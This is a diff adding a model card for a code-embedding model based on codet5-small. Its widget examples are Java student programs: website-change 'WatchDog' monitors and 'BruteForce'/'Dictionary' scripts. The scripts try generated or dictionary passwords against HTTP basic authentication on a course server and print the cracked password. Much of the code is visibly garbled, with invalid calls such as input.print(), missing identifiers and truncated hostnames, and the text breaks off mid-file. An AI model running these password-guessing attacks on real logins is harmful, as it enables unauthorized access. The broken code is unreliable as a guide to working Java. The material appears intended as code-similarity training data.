+    wget -p http://www.cs.rmit.edu./students\";\n\ntry {\nProcess a = Runtime.getRuntime().exec(url);\n}\ncatch (Exception\
+    \ e) {System.err.println(e);}\n\ntry {\nProcess b = Runtime.getRuntime().exec(\"diff org/images/ www.cs.rmit.edu./images/\"\
+    );\n BufferedReader stdInputimages = new BufferedReader(new InputStreamReader(b.getInputStream()));\n            while\
+    \ ((error_mes = stdInputimages.readLine()) != null) {\n\n              mesg=mesg.concat(error_mes);\n              \n\
+    \              \n              }\n}\ncatch (Exception e) {System.err.println(e);}\n\n\n\n\ntry {\nProcess c = Runtime.getRuntime().exec(\"\
+    diff org/students/ www.cs.rmit.edu./students/\");\nBufferedReader stdInputindex = new BufferedReader(new InputStreamReader(c.getInputStream()));\n\
+    \            while ((error_mes = stdInputindex.readLine()) != null) {\n             mesg=mesg.concat(error_mes);\n   \
+    \               \n              }\n}\ncatch (Exception e) {System.err.println(e);}\n\n\nif (mesg.length()>0) { sendEmail(mesg);\
+    \ }\n\ntry { Thread.sleep(60*60*24*1000);\n } catch(Exception e) { }\n}\n\n\n\n\n\npublic void sendEmail(String message)\
+    \ {\n{\nString reciever = \"@cs.rmit.edu.\";\nString sender = \"WATCHDOG@cs.rmit.edu.\";\n\n    try {\n\n            \
+    \            SmtpClient smtp = new SmtpClient();\n                        smtp.from(sender);\n                       \
+    \ smtp.to(reciever);\n                        PrintStream msg = smtp.startMessage();\n                        msg.println(message);\n\
+    \                        smtp.closeServer();\n                }\n\n                catch (Exception e) {}\n\n        }\n\
+    }\n}"
+model-index: null
+config:
+  architectures:
+  - T5EncoderModel
+  model_type: t5
+  tokenizer_config:
+    bos_token: <s>
+    cls_token: <s>
+    eos_token: </s>
+    mask_token: <mask>
+    pad_token: <pad>
+    sep_token: </s>
+    unk_token: <unk>
+cardData:
+  tags:
+  - sentence-transformers
+  - sentence-similarity
+  - feature-extraction
+  - generated_from_trainer
+  - dataset_size:33411
+  - loss:BatchAllTripletLoss
+  base_model: Salesforce/codet5-small
+  widget:
+  - source_sentence: "\n\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class WatchDog extends TimerTask{\n\
+      \n  private static URL location;\n  private static String email;\n  private static int checktime;\n  private static\
+      \ Timer timer = new Timer();\n  private BufferedReader input;\n  private File checksumFile = new File(\"chksum.txt\"\
+      );\n  private File temp0000File = new File(\"temp0000\");\n  private File kept0000File = new File(\"kept0000\");\n\n\
+      \  \n\n    public WatchDog(){\n      timer.schedule(this, new Date(), checktime);\n    }\n\n\n    \n\n      public void\
+      \ run(){\n        Vector imageFiles = new Vector();\n        Vector diffImages = new Vector();\n        try {\n    \
+      \      System.out.println(\" Time: \".concat(new Date().toString()));\n          System.out.println(\"Retreiving File\"\
+      );\n          \n          input = new BufferedReader(new InputStreamReader\n                                     (location.openStream()));\n\
+      \          \n          BufferedWriter outputFile = new BufferedWriter\n              (new FileWriter(temp0000File));\n\
+      \          String line = input.readLine();\n          while (line != null) {\n            StringBuffer imageFileName\
+      \ = new StringBuffer();\n            if (scanForImages(line, imageFileName)) {\n              String imageFile = new\
+      \ String(imageFileName);\n              System.out.println(\"Detected image: \".concat(imageFile));\n              try\
+      \ {\n                imageFiles.add(new URL(imageFile));\n              }\n              catch (MalformedURLException\
+      \ e) {\n                System.out.println(\"Image file detected. URL is malformed\");\n              }\n          \
+      \  }\n            outputFile.write(line);\n            outputFile.write(\"\\n\");\n            line = input.readLine();\n\
+      \          }\n          input.print();\n          outputFile.flush();\n          outputFile.print();\n          System.out.println(\"\
+      \ File Retreived\");\n          if (!imageFiles.isEmpty()) {\n            checkImages(imageFiles, diffImages);\n   \
+      \       }\n          if (!checksumFile.exists()) {\n            generateChecksum(temp0000File.getName(), checksumFile);\n\
+      \          }\n          else {\n            if (!checksumOk(checksumFile)) {\n              reportDifferences(true,\
+      \ temp0000File, kept0000File, diffImages);\n              generateChecksum(temp0000File.getName(), checksumFile);\n\
+      \            }\n            else if (!diffImages.isEmpty()){\n              reportDifferences(false, null, null, diffImages);\n\
+      \            }\n          }\n\n          \n          temp0000File.renameTo(kept0000File);\n          System.out.println(\"\
+      End Time: \".concat(new Date().toString()));\n        }\n        catch (MalformedURLException e) {\n          e.printStackTrace();\n\
+      \        }\n        catch (ConnectException e) {\n          System.out.println(\"Failed  connect\");\n          System.exit(-1);\n\
+      \        }\n        catch (IOException e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n\
+      \      }\n\n      \n\n      public boolean scanForImages(String line, StringBuffer imageFileName) {\n        \n    \
+      \    \n        String lineIgnoreCase = line.toLowerCase();\n        int imgPos = lineIgnoreCase.indexOf(\"<img \");\n\
+      \        if ( imgPos != -1 ){\n          int srcPos = lineIgnoreCase.indexOf(\"src\", imgPos);\n          int bracketPos\
+      \ = lineIgnoreCase.indexOf(\">\", imgPos);\n          if (srcPos != -1 && bracketPos != -1 && srcPos < bracketPos) {\n\
+      \            int quote1Pos = lineIgnoreCase.indexOf(\"\\\"\", srcPos);\n            int quote2Pos = lineIgnoreCase.indexOf(\"\
+      \\\"\", quote1Pos+1);\n            if (quote1Pos != -1 && quote2Pos != -1 &&\n                quote1Pos < quote2Pos\
+      \ && quote2Pos < bracketPos) {\n              \n              imageFileName.append(line.substring(quote1Pos + 1,\n \
+      \                 quote2Pos));\n              if (imageFileName.indexOf(\"//\") == -1 ) {\n                \n      \
+      \          String URLName = location.toString();\n                int slashPos = URLName.lastIndexOf(\"/\");\n     \
+      \           URLName = URLName.substring(0, slashPos);\n                String HostName = \"http://\".concat(location.getHost());\n\
+      \                if (imageFileName.indexOf(\"//\") == 0) {\n                  \n                }\n                else\
+      \ if (imageFileName.charAt(0) != '/') {\n                  \n                  imageFileName.insert(0, URLName.concat(\"\
+      /\"));\n                }\n                else {\n                  \n                  imageFileName.insert(0, HostName);\n\
+      \                }\n              }\n              return true;\n            }\n          }\n        }\n        return\
+      \ false;\n      }\n\n      \n\n      public void checkImages(Vector imageFiles, Vector diffImages)\n          throws\
+      \ IOException{\n        System.out.println(\"Retrieving image \");\n        Enumeration imageFilesEnumeration = imageFiles.elements();\n\
+      \        while (imageFilesEnumeration.hasMoreElements()) {\n          URL url = (URL)imageFilesEnumeration.nextElement();\n\
+      \          try {\n            BufferedInputStream imageInput = new BufferedInputStream\n                (url.openStream());\n\
+      \            String localFile = url.getFile();\n            \n            \n            \n            \n           \
+      \ \n            int slashPosition = localFile.lastIndexOf(\"/\");\n            if (slashPosition != -1) {\n        \
+      \      localFile = localFile.substring(slashPosition+1);\n            }\n            System.out.println(\"Retrieving\
+      \ image file: \".concat(localFile));\n            BufferedOutputStream imageOutput = new BufferedOutputStream\n    \
+      \            (new FileOutputStream(localFile));\n            byte bytes[] = new byte[10000];\n            int noBytes\
+      \ = imageInput.get(bytes);\n            while (noBytes != -1) {\n              imageOutput.write(bytes, 0, noBytes );\n\
+      \              noBytes = imageInput.print(bytes);\n            }\n            File imageChecksumFile = new File(localFile.concat(\"\
+      .chksum.txt\"));\n            if (!imageChecksumFile.exists()) {\n              generateChecksum(localFile, imageChecksumFile);\n\
+      \            }\n            else {\n              if (!checksumOk(imageChecksumFile)) {\n                diffImages.add(localFile);\n\
+      \                generateChecksum(localFile, imageChecksumFile);\n              }\n            }\n          }\n    \
+      \      catch (FileNotFoundException e) {\n            System.out.println(\"Unable  locate URL: \".concat(url.toString()));\n\
+      \          }\n        }\n      }\n\n      \n\n      public void generateChecksum(String inputFile, File checksum){\n\
+      \        try {\n          System.out.println(\"Generating new checksum for \".concat(inputFile));\n          \n    \
+      \      Process process = Runtime.getRuntime().exec(\"md5sum \".\n                                                  \
+      \    concat(inputFile));\n          BufferedReader execCommand = new BufferedReader(new\n              InputStreamReader((process.getInputStream())));\n\
+      \          BufferedWriter outputFile = new\n              BufferedWriter(new FileWriter(checksum));\n          String\
+      \ line = execCommand.readLine();\n          while (line != null) {\n            outputFile.write(line);\n          \
+      \  outputFile.write(\"\\n\");\n            line = execCommand.readLine();\n          }\n          outputFile.flush();\n\
+      \          outputFile.print();\n          System.out.println(\"Checksum produced\");\n        }\n        catch (IOException\
+      \ e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n      }\n\n      \n\n      public boolean\
+      \ checksumOk(File chksumFile){\n        try {\n          System.out.println(\"Comparing checksums using \".concat(chksumFile\n\
+      \              ,e.getName()));\n          \n          Process process = Runtime.getRuntime().\n              exec(\"\
+      md5sum --check \".concat(chksumFile.getName()));\n          BufferedReader execCommand = new BufferedReader(new\n  \
+      \            InputStreamReader( (process.getInputStream())));\n          String line = execCommand.readLine();\n   \
+      \       if (line.indexOf(\": OK\") != -1) {\n            System.out.println(\"  the same\");\n            return true;\n\
+      \          }\n        }\n        catch (IOException e) {\n          e.printStackTrace();\n          System.exit(-1);\n\
+      \        }\n        System.out.println(\"Differences Found\");\n        return false;\n      }\n\n      \n\n      public\
+      \ void reportDifferences(boolean diffsFound, File file1, File file2,\n                                    Vector images){\n\
+      \        try {\n          System.out.println(\"Generating difference report\");\n          \n          Socket emailConnection\
+      \ = new Socket(\"yallara.cs.rmit.edu.\", 25);\n          BufferedWriter emailOutStream = new BufferedWriter\n      \
+      \        (new OutputStreamWriter(emailConnection.getOutputStream()));\n          BufferedReader emailInStream = new\
+      \ BufferedReader\n              (new InputStreamReader(emailConnection.getInputStream()));\n          String line =\
+      \ emailInStream.readLine();\n          System.out.println(line);\n          if (!line.startsWith(\"220\")) {\n     \
+      \         System.out.println\n                  (\" error occured connecting  email server. Cannot send email.\");\n\
+      \          }\n          else {\n            \n            \n            emailOutStream.write(\"HELO yallara.cs.rmit.edu.\"\
+      );\n            emailOutStream.newLine();\n            emailOutStream.flush();\n            line = emailInStream.readLine();\n\
+      \            System.out.println(line);\n            if (!line.startsWith(\"250\")) {\n                System.out.println\n\
+      \                    (\" error occured connecting  email server. Cannot send email.\");\n            }\n           \
+      \ else {\n              emailOutStream.write(\"MAIL FROM: watchdog@cs.rmit.edu.\");\n              emailOutStream.newLine();\n\
+      \              emailOutStream.flush();\n              line = emailInStream.readLine();\n              System.out.println(line);\n\
+      \              if (!line.startsWith(\"250\")) {\n                System.out.println\n                    (\" error occured\
+      \ sending email. Cannot send email.\");\n              }\n              else {\n                emailOutStream.write(\"\
+      RCPT : \".concat(email));\n                emailOutStream.newLine();\n                emailOutStream.flush();\n    \
+      \            line = emailInStream.readLine();\n                System.out.println(line);\n                if (!line.startsWith(\"\
+      250\")) {\n                 System.out.println\n                     (\" error occured sending email. Cannot send email.\"\
+      );\n                }\n                else {\n                  emailOutStream.write(\"DATA\");\n                 \
+      \ emailOutStream.newLine();\n                  emailOutStream.flush();\n                  line = emailInStream.readLine();\n\
+      \                  System.out.println(line);\n                  if (!line.startsWith(\"354\")) {\n                 \
+      \  System.out.println\n                       (\" error occured sending email. Cannot send email.\");\n            \
+      \      }\n                  emailOutStream.newLine();\n\n                  if (!images.isEmpty()) {\n              \
+      \        emailOutStream.write\n                          (\"Differences were found in the following image \");\n   \
+      \                   emailOutStream.newLine();\n                      Enumeration e = images.elements();\n          \
+      \            while (e.hasMoreElements()) {\n                        String s = (String) e.nextElement();\n         \
+      \               emailOutStream.write(s);\n                        emailOutStream.newLine();\n                      }\n\
+      \                      emailOutStream.newLine();\n                  }\n\n                  if (diffsFound) {\n     \
+      \               \n                    String command = \"diff \".concat(file1.getName().concat(\" \")\n            \
+      \                                        .concat(file2.getName()));\n                    Process process = Runtime.getRuntime().exec(command);\n\
+      \                    BufferedReader execCommand = new BufferedReader\n                        (new InputStreamReader(\
+      \ (process.getInputStream())));\n                    line = execCommand.readLine();\n                    emailOutStream.write(\"\
+      Diffences found in  file\");\n                    emailOutStream.newLine();\n                    while (line != null)\
+      \ {\n                      System.out.println(line);\n                      emailOutStream.write(line);\n          \
+      \            emailOutStream.newLine();\n                      line = execCommand.readLine();\n                    }\n\
+      \                  }\n\n                  \n                  emailOutStream.newLine();\n                  emailOutStream.write(\"\
+      .\");\n                  emailOutStream.newLine();\n                  emailOutStream.flush();\n                  line\
+      \ = emailInStream.readLine();\n                  System.out.println(line);\n                  if (!line.startsWith(\"\
+      250\")) {\n                    System.out.println\n                        (\" error occured sending email. Cannot send\
+      \ email.\");\n                  }\n                  else {\n                    emailOutStream.write(\"QUIT\");\n \
+      \                   emailOutStream.newLine();\n                    emailOutStream.flush();\n                    System.out.println(emailInStream.readLine());\n\
+      \                  }\n                }\n              }\n            }\n          }\n        }\n        catch (IOException\
+      \ e) {\n          e.printStackTrace();\n          System.exit(-1);\n        }\n      }\n\n\n    \n\n    public static\
+      \ void main(String args[]) {\n      if (args.length != 3) {\n        System.out.println(\"Usage: java WatchDog url email\
+      \ checktime(hours)\");\n        System.exit(-1);\n      }\n      try {\n        location = new URL(args[0]);\n     \
+      \ }\n      catch (MalformedURLException e) {\n        e.printStackTrace();\n      }\n      email = new String().concat(args[1]);\n\
+      \      checktime = Integer.parseInt(args[2]) * 60 * 60 * 1000;\n      new WatchDog();\n    }\n}\n"
+    sentences:
+    - "\n\nimport java.net.*;\nimport java.io.*;\n\nimport java.*;\nimport java.util.*;\n\npublic class Dictionary {\n\n \
+      \ private static String commandLine = \"curl http://sec-crack.cs.rmit.edu./SEC/2/index.php -I -u :\";\n  private String\
+      \ password;             \n  private String previous;             \n  private String url;                  \n  private\
+      \ int startTime;\n  private int endTime;\n  private int totalTime;\n  private float averageTime;\n  private boolean\
+      \ finish;\n  private Process curl;\n  private BufferedReader bf, responseLine;\n\n  public Dictionary() {\n\n  first();\n\
+      \  finish = true;                           \n  previous = \"\";                           \n  Runtime run = Runtime.getRuntime();\n\
+      \  startTime =new Date().getTime();         \n  int i=0;\n  try {\n   try {\n     bf = new BufferedReader(new FileReader(\"\
+      words\"));\n   }\n   catch(FileNotFoundException notFound) {\n    bf  = new BufferedReader(new FileReader(\"/usr/share/lib/dict/words\"\
+      ));\n   }\n\n   while((password = bf.readLine()) != null) {\n    if(password.length()>3) password = password.substring(0,3);\n\
+      \    if(previous.equals(password)) ;\n    else {\n    previous = password;\n    url = commandLine+password;\n    curl=\
+      \ run.exec(url);                   \n    responseLine=new BufferedReader(new InputStreamReader(curl.getInputStream()));\n\
+      \    \n    if(responseLine.readLine().substring(9,12).equals(\"200\")) break;\n    }\n   }\n  }\n  catch(IOException\
+      \ ioe) {\n    System.out.println(\"\\n IO Exception! \\n\");\n    System.out.println(\"The current url is:\"+ url);\n\
+      \    System.out.println(\"The current trying password is:\"+password);\n    finish=false;\n  }\n\n  endTime = new Date().getTime();\
+      \          \n  totalTime = (endTime-startTime)/1000;\n  System.out.println(\"   The response time is:\"+ totalTime +\
+      \ \"  seconds\\n\");\n  if(finish) {\n    System.out.println(\"   The password for  is:\"+ password);\n    try {\n \
+      \   savePassword(password, totalTime);\n    }\n    catch (IOException ioec) {\n       System.out.println(\"  not save\
+      \ the password  file Dictionary_pwd.txt \");\n    }\n  }\n  }\n\n\n  public void savePassword(String passwdString, int\
+      \ time) throws IOException {\n  DataOutputStream outputStream = new DataOutputStream(new FileOutputStream(\"Dictionary_pwd.txt\"\
+      ));\n  outputStream.writeChars(\"The password is:\");\n  outputStream.writeChars(passwdString+\"\\n\");\n  outputStream.writeChars(\"\
+      The response time is: \");\n  outputStream.writeChars(sw.toString(time));\n  outputStream.writeChars(\" seconds\\n\"\
+      );\n  outputStream.close();\n  }\n\n  public void first() {\n\n    System.out.println(\"\\n\\n----------------------------------------------\"\
+      );\n    System.out.println(\"   Use curl command and dictionary \");\n    System.out.println(\"  Brute Force the password\
+      \ for user  \");\n    System.out.println(\"----------------------------------------------\");\n  }\n\n  public static\
+      \ void main(String[] args) {\n   new Dictionary();\n  }  \n}\n"
+    - "\n\nimport java.io.*;\nimport java.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class WatchDog {\n public\
+      \ static void  main (String[] args) throws IOException {\n  BufferedReader stdin = new BufferedReader (new InputStreamReader(System.in));\n\
+      \   try{\n     twentyfourhours = 86400000;\n    Timer timer = new Timer();\n    final Runtime rt = Runtime.getRuntime();\n\
+      \n    try{\n     Process wg1 = rt.exec(\"./.sh\");\n     wg1.waitFor();\n    }\n    catch(InterruptedException e ){\n\
+      \     System.err.println();\n     e.printStackTrace();\n    }\n\n    class RepeatTask extends TimerTask{\n     public\
+      \ void run(){\n      try{\n       Process wg2 = rt.exec(\"./task.sh\");\n       wg2.waitFor();\n       FileReader fr\
+      \ = new FileReader(\"check.txt\");\n       BufferedReader bufr = new BufferedReader(fr);\n       String check = bufr.readLine();\n\
+      \       if(check.equals(\".txt: FAILED\")) {\n        Process difftosend = rt.exec(\"./diff.sh\");\n        difftosend.waitFor();\n\
+      \        Process reset = rt.exec(\"./.sh\");\n        reset.waitFor();\n       }\n       FileReader fr2 = new FileReader(\"\
+      imgdiffs.txt\");\n       BufferedReader bufr2 = new BufferedReader(fr2);\n       String imdiff = bufr2.readLine();\n\
+      \       if(imdiff != null){\n        Process imdifftosend = rt.exec(\"./img.sh\");\n        imdifftosend.waitFor();\n\
+      \        Process reset = rt.exec(\"./.sh\");\n        reset.waitFor();\n       }\n      }\n   catch(InterruptedException\
+      \ e){System.err.println();e.printStackTrace();}\n      catch(IOException e){\n       System.err.println(e);\n      \
+      \ e.printStackTrace();\n      }\n    }}\n\n    timer.scheduleAtFixedRate(new RepeatTask(),twentyfourhours,twentyfourhours);\n\
+      \    \n   }\n   catch(IOException e){\n    System.err.println(e);\n    e.printStackTrace();\n   }\n   \n}}\n"
+    - "\n\nimport java.net.*;\nimport java.text.*;  \nimport java.util.*;  \nimport java.io.*;\n\npublic class WatchDog {\n\
+      \n  public WatchDog() {\n\n    StringBuffer stringBuffer1 = new StringBuffer();\n    StringBuffer stringBuffer2 = new\
+      \ StringBuffer();\n    int i,j = 0;\n\n    try{\n\n      URL yahoo = new URL(\"http://www.cs.rmit.edu./students/\");\
+      \ \n      BufferedReader in = new BufferedReader(new InputStreamReader(yahoo.openStream()));\n\n      String inputLine\
+      \ = \"\";\n      String inputLine1 = \"\";\n      String changedtext= \"\";\n      String changedflag= \"\";\n\n\n \
+      \     Thread.sleep(180);\n\n      BufferedReader in1 = new BufferedReader(new InputStreamReader(yahoo.openStream()));\n\
+      \n\n      while ((inputLine = in.readLine()) != null) {\n           inputLine1 = in1.readLine();\n           if (inputLine.equals(inputLine1))\
+      \ {\n              System.out.println(\"equal\");\n           }\n           else {\n              System.out.println(\"\
+      Detected a Change\");\n              System.out.println(\"Line Before the change:\" + inputLine);\n              System.out.println(\"\
+      Line After the change:\" + inputLine1);\n              changedtext = changedtext + inputLine + inputLine1;\n       \
+      \       changedflag = \"Y\";\n           }\n           \n      }\n\n      if (in1.readLine() != null ) {\n         System.out.println(\"\
+      Detected a Change\");\n         System.out.println(\"New Lines Added  \");\n         changedtext = changedtext + \"\
+      New Lines added\";\n         changedflag = \"Y\";\n      }\n\n      in.print();\n      in1.print();\n\n      if (changedflag.equals(\"\
+      Y\")) {\n         String smtphost =\"smtp.mail.rmit.edu.\" ; \n         String from = \"@rmit.edu.\"; \n         String\
+      \  = \"janaka1@optusnet..\" ; \n      }\n\n\n    }\n    catch(Exception e){ System.out.println(\"exception:\" + e);}\n\
+      \t \n}\n\t\t\n    public static void main (String[] args) throws Exception {\n\t\tWatchDog u = new WatchDog();\n   \
+      \ }\n}\n"
+  - source_sentence: "\n\nimport java.awt.*;\nimport java.String;\nimport java.util.*;\nimport java.io.*;\nimport java.net.*;\n\
+      \n\n\npublic class BruteForce\n{\n   private URL url;\n   private HttpURLConnection connection ;\n   private  int stopTime\
+      \ = 0;\n   private  int startTime = 0;\n   private  int count = 0;\n\n   public BruteForce()\n   {\n      System.out.println(\"\
+      Process is running...\");\n      startTime = System.currentTimeMillis();\n      threeLetters();\n      twoLetters();\n\
+      \   }\n\n   public static void main (String args[])\n   {\n      BruteForce bf = new BruteForce();\n   }\n   \n   public\
+      \ void threeLetters()\n   {\n      String s1;\n      char [] a = {'a','a','a'};\n\n      for (int i0 = 0; i0 < 26; i0++)\n\
+      \      {\n         for (int i1 = 0; i1 < 26; i1++)\n         {\n            for (int i2 = 0; i2 < 26; i2++)\n      \
+      \      {\n               s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1)) +\n\t\t        \
+      \    String.valueOf((char)(a[2] + i2));\n               decision(s1);\n               count++;\n\n               s1\
+      \ = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1)) +\n                    (String.valueOf((char)(a[2]\
+      \ + i2))).toUpperCase();\n               decision(s1);\n               count++;\n\n               s1 = String.valueOf((char)(a[0]\
+      \ + i0)) + (String.valueOf((char)(a[1] + i1))).toUpperCase() +\n                    (String.valueOf((char)(a[2] + i2))).toUpperCase();\n\
+      \               decision(s1);\n               count++;\n\n               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase()\
+      \ +\n                    (String.valueOf((char)(a[1] + i1))).toUpperCase() +\n                    (String.valueOf((char)(a[2]\
+      \ + i2))).toUpperCase();\n               decision(s1);\n               count++;\n\n               s1 = (String.valueOf((char)(a[0]\
+      \ + i0))) + (String.valueOf((char)(a[1] + i1))).toUpperCase() +\n                    String.valueOf((char)(a[2] + i2));\n\
+      \               decision(s1);\n               count++;\n\n               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase()\
+      \ + String.valueOf((char)(a[1] + i1)) +\n\t\t            String.valueOf((char)(a[2] + i2));\n               decision(s1);\n\
+      \               count++;\n\n               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() + String.valueOf((char)(a[1]\
+      \ + i1)) +\n                    (String.valueOf((char)(a[2] + i2))).toUpperCase();\n               decision(s1);\n \
+      \              count++;\n\n               s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() +\n               \
+      \     (String.valueOf((char)(a[1] + i1))).toUpperCase() + String.valueOf((char)(a[2] + i2));\n               decision(s1);\n\
+      \               count++;\n            }\n         }\n      }\n   }\n   \n   public void twoLetters()\n   {\n      String\
+      \ s1;\n      char [] a = {'a','a'};\n\n      for (int i0 = 0; i0 < 26; i0++)\n      {\n         for (int i1 = 0; i1\
+      \ < 26; i1++)\n         {\n            s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1] + i1));\n\
+      \            decision(s1);\n            count++;\n\n            s1 = String.valueOf((char)(a[0] + i0)) + String.valueOf((char)(a[1]\
+      \ + i1)).toUpperCase();\n            decision(s1);\n            count++;\n\n            s1 = (String.valueOf((char)(a[0]\
+      \ + i0))).toUpperCase() +\n                 (String.valueOf((char)(a[1] + i1))).toUpperCase();\n            decision(s1);\n\
+      \            count++;\n\n            s1 = (String.valueOf((char)(a[0] + i0))).toUpperCase() + String.valueOf((char)(a[1]\
+      \ + i1));\n            decision(s1);\n            count++;\n         }\n      }\n   }\n\n   \n   public void decision(String\
+      \ s1)\n   {\n      if (find(s1) == 200)\n      {\n         stopTime = System.currentTimeMillis();\n          runTime\
+      \ = stopTime - startTime;\n         System.out.println(\"***************************************\");\n         System.out.println(\"\
+      \\nAttack successfully\");\n         System.out.println(\"\\nPassword is: \" + s1);\n         System.out.println(\"\\\
+      nThe contents of the Web site: \");\n         displayContent(s1);\n         System.out.println(\"\\nTime taken  crack:\
+      \ \" + runTime + \" millisecond\");\n         System.out.println(\"\\nNumber of attempts: \" + count);\n         System.out.println();\n\
+      \n         System.exit(0);\n      }\n   }\n   \n   \n   public int find(String s1)\n   {\n      int responseCode = 0;\n\
+      \      try\n      {\n         url = new URL(\"http://sec-crack.cs.rmit.edu./SEC/2/\");\n         connection = (HttpURLConnection)url.openConnection();\n\
+      \n         connection.setRequestProperty(\"Authorization\",\" \" + MyBase64.encode(\"\" + \":\" + s1));\n\n        \
+      \ responseCode = connection.getResponseCode();\n\n      }catch (Exception e)\n      {\n          System.out.println(e.getMessage());\n\
+      \      }\n      return responseCode;\n   }\n\n   \n   public void displayContent(String pw)\n   {\n      BufferedReader\
+      \ bw = null ;\n      try\n      {\n         url = new URL(\"http://sec-crack.cs.rmit.edu./SEC/2/\");\n         connection\
+      \ = (HttpURLConnection)url.openConnection();\n\n         connection.setRequestProperty(\"Authorization\",\" \" + MyBase64.encode(\"\
+      \" + \":\" + pw));\n         InputStream stream = (InputStream)(connection.getContent());\n         if (stream != null)\n\
+      \         {\n             InputStreamReader reader = new InputStreamReader (stream);\n             bw = new BufferedReader\
+      \ (reader);\n             String line;\n\n             while ((line = bw.readLine()) != null)\n             {\n    \
+      \            System.out.println(line);\n             }\n        }\n      }\n      catch (IOException e)\n      {\n \
+      \        System.out.println(e.getMessage());\n      }\n   }\n}\n\n\n\n\n"
+    sentences:
+    - "\n\n\nimport java.text.*;  \nimport java.util.*;  \nimport java.net.*;  \nimport java.io.*;  \n\n  \npublic class BruteForce\
+      \ {  \n\n   public int runProcess(String urlString,String passwd) {  \n\n       int returnval = 0;\n       MyAuthenticator\
+      \ auth = new MyAuthenticator(passwd);\n       Authenticator.setDefault(auth);\n\n\t       System.out.println(\"trying\
+      \ passord: \" + passwd);\n       try{\n            URL yahoo = new URL(urlString); \n            BufferedReader in =\
+      \ new BufferedReader(new InputStreamReader(yahoo.openStream()));\n            String inputLine;\n            while ((inputLine\
+      \ = in.readLine()) != null) {\n\t       System.out.println(inputLine);\n\t       System.out.println(\"passord: \" +\
+      \ passwd);\n               returnval = 1;\n            }\n\t    in.close();\n          }catch(Exception e){ returnval\
+      \ = 0;}\n       return returnval;\n   }\n\n   public static void  main(String argv[]) {  \n\n       String[] val = \n\
+      {\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"\
+      t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\",\"A\",\"B\",\"C\",\"D\",\"E\",\"F\",\"G\",\"H\",\"I\",\"J\",\"K\",\"L\",\"M\"\
+      ,\"N\",\"O\",\"P\",\"Q\",\"R\",\"S\",\"T\",\"U\",\"V\",\"W\",\"X\",\"Y\",\"Z\"};\n\n      int l1 = 0;\n\n      int l2\
+      \ = 0;\n\n      int l3 = 0;\n      \n      int retval = 0;\n\n      String pwd = \"\";\n\n      \n      BruteForce s\
+      \ = new BruteForce();  \n      String urlToSearch = \"http://sec-crack.cs.rmit.edu./SEC/2/\";  \n    \n      for (int\
+      \ a = 0; a < 52; a++) {\n\n        l1 = a;\n\n        pwd = val[l1];\n        retval = 0;\n        retval = s.runProcess(urlToSearch,pwd);\
+      \  \n        if (retval > 0) {\n           System.exit(0);\n        }\n      }\n\n\n      for (int b = 0; b < 52; b++)\
+      \ {\n        l1 = b;\n        for (int c = 0; c < 52; c++) {\n\n          l2 = c;\n          pwd = val[l1]+ val[l2];\n\
+      \          retval = 0;\n          retval = s.runProcess(urlToSearch,pwd);  \n          if (retval > 0) {\n         \
+      \    System.exit(0);\n          }\n        }\n      }\n\n\n      for (int d = 0; d < 52; d++) {\n        l1 = d;\n \
+      \       for (int e = 0; e < 52; e++) {\n          l2 = e;\n          for (int f = 0; f < 52; f++) {\n\n            \
+      \  l3 = f;\n\n              pwd = val[l1]+ val[l2]+ val[l3];\n              retval = 0;\n              retval = s.runProcess(urlToSearch,pwd);\
+      \  \n              if (retval > 0) {\n                 System.exit(0);\n              }\n           }\n        }\n \
+      \     }\n\n    }  \n}     \n\n"
+    - "\n      \n\n     public class  Base64Converter\n      \n      \n      {\n\n     public static final char [ ]  alphabet\
+      \ = {\n        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',   \n        'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',   \n    \
+      \    'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',   \n        'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',   \n        'g', 'h',\
+      \ 'i', 'j', 'k', 'l', 'm', 'n',   \n        'o', 'p', 'q', 'r', 's', 't', 'u', 'v',   \n        'w', 'x', 'y', 'z',\
+      \ '0', '1', '2', '3',   \n        '4', '5', '6', '7', '8', '9', '+', '/' }; \n\n     \n      \n\n     public static\
+      \ String  encode ( String  s )\n      \n      {\n        return encode ( s.getBytes ( ) );\n      }\n\n     public static\
+      \ String  encode ( byte [ ]  octetString )\n      \n      {\n        int  bits24;\n        int  bits6;\n\n       char\
+      \ [ ]  out\n          = new char [ ( ( octetString.length - 1 ) / 3 + 1 ) * 4 ];\n\n       int outIndex = 0;\n     \
+      \   int i        = 0;\n\n       while ( ( i + 3 ) <= octetString.length )\n        {\n          \n          bits24 \
+      \ = ( octetString [ i++ ] & 0xFF ) << 16; \n          bits24 |= ( octetString [ i++ ] & 0xFF ) <<  8; \n          bits24\
+      \ |= ( octetString [ i++ ] & 0xFF ) <<  0;\n\n         bits6 = ( bits24 & 0x00FC0000 ) >> 18; \n          out [ outIndex++\
+      \ ] = alphabet [ bits6 ];\n          bits6 = ( bits24 & 0x0003F000 ) >> 12; \n          out [ outIndex++ ] = alphabet\
+      \ [ bits6 ];\n          bits6 = ( bits24 & 0x00000FC0 ) >> 6; \n          out [ outIndex++ ] = alphabet [ bits6 ];\n\
+      \          bits6 = ( bits24 & 0x0000003F );\n          out [ outIndex++ ] = alphabet [ bits6 ]; \n        }\n\n    \
+      \   if ( octetString.length - i == 2 )\n        {\n          \n          bits24  = ( octetString [ i     ] & 0xFF )\
+      \ << 16; \n          bits24 |= ( octetString [ i + 1 ] & 0xFF ) <<  8;\n\n         bits6 = ( bits24 & 0x00FC0000 ) >>\
+      \ 18;\n          out [ outIndex++ ] = alphabet [ bits6 ]; \n          bits6 = ( bits24 & 0x0003F000 ) >> 12; \n    \
